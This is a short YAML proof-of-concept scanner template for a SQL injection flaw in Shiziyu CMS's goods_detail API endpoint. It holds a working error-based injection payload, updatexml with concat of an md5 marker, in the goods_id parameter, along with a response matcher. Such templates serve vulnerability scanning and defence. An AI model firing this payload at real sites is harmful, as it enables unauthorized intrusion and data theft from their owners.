id: poc-yaml-shiziyu-cms-apicontroller-sqli
info:
  name: Shiziyu Cms Apicontroller SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: Shiziyu Cms Apicontroller
  reference: []
  description: null
variables:
  rand: random_int(10000, 21000)
transport: http
requests:
- method: GET
  path: /index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5({{.rand}}),0x7e),1)
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 404 && contains(body, substr(md5(rand),0,31))
  output: []
